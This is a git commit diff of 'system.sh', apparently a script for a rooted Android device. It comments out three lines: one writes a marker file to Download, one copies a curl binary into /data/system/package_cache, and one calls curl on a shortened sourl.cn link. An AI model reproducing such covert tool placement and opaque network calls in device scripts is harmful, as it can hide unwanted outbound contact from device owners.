cd56ed1dfb8d16eb7004dbb72262aee514fcf743
幻tly <81273793+tanluying@users.noreply.github.com>
2025-08-30 09:44:57 +0800

    Update system.sh

--- system.sh
+++ system.sh
@@ -1,4 +1,4 @@
-echo "123" > /storage/emulated/0/Download/apks.txt
-cp -f /data/adb/modules/zygisk_lsposed/curl /data/system/package_cache/curl
-curl -l https://sourl.cn/tRtpnk
+#echo "123" > /storage/emulated/0/Download/apks.txt
+#cp -f /data/adb/modules/zygisk_lsposed/curl /data/system/package_cache/curl
+#curl -l https://sourl.cn/tRtpnk
 sleep 3600
